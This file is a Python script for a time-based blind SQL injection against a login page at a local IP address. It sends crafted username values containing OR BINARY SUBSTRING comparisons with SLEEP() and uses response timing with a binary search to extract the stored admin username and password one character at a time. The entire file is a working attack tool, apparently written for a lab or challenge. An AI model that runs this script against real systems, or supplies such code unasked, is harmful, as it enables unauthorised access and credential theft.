import requests
import string
import time

# SELECT password FROM admins WHERE username='%s'

def check_field(uri, fieldname, value, payload_start="' OR "):
    # The word binary in the request is essential to make it case sensitive (learned it the hard way)
    payload_template = payload_start+"BINARY "+fieldname+"='{0}' AND SLEEP({1})#"    
    post_data=dict()
    post_data["password"]=""
    sleep_duration=2


    post_data["username"]=payload_template.format(value.replace("'", "''"), sleep_duration)
    t=time.time()
    requests.post(uri, post_data)
    if time.time()-t>=sleep_duration:
        return True
    return False

def find_nth_letter(uri, alphabet, fieldname, n=1, payload_start="' OR "):
    post_data=dict()
    post_data["password"]=""
    sleep_duration=0.8
    gte=">="
    lt="<"

    payload_template = payload_start+"BINARY SUBSTRING("+fieldname+",{0},1){1}'{2}' AND SLEEP({3})#"


    start=0
    end=len(alphabet)
    while end-start>1:
        i=(start+end)//2
        c=alphabet[i]
        if c=="'":
            escaped_c="''"
        else:
            escaped_c=c
        post_data["username"]=payload_template.format(n,gte,escaped_c, sleep_duration)
        t=time.time()
        requests.post(uri, post_data)
        gte_time=time.time()-t
        if gte_time>=sleep_duration:
            start=i
        else:
            post_data["username"]=payload_template.format(n,lt,escaped_c, sleep_duration)
            t=time.time()
            requests.post(uri, post_data)
            lt_time=time.time()-t
        
            if lt_time>=sleep_duration:
                end=i
            else:
                return None
    return alphabet[start]


# headstart is meant to be some kind of checkpoint system.
# if you found a part of the word you can skip. The first letter is the 1st not the 0th, to be consistent with SQL (see SUBSTRING documentation)
def find_field(uri, fieldname, alphabet, headstart=1, payload_start="' OR "):
    found_so_far=""
    i=headstart
    print("Looking for", fieldname)
    done=False
    while not done:
        c=find_nth_letter(uri, alphabet, fieldname, i, payload_start=payload_start)
        if c==None:
            done=True
        else:
            found_so_far+=c
            print("Found so far:", found_so_far)
            done=check_field(uri, fieldname, found_so_far, payload_start=payload_start)
        i+=1
    print("itiz deune")
    return found_so_far

def do_it():
    protocol = "http"
    ip = "192.168.1.1"
    path = "login"
    uri= "{0}://{1}/{2}".format(protocol, ip, path)
    
    l=[ord(e) for e in string.printable]
    l.sort()
    alphabet="".join(chr(e) for e in l)
    username=find_field(uri, "username", alphabet)
    print("username", ":", username)
    print()
    print("password", ":", find_field(uri, "password", alphabet, payload_start="{0}' AND ".format(username)))
    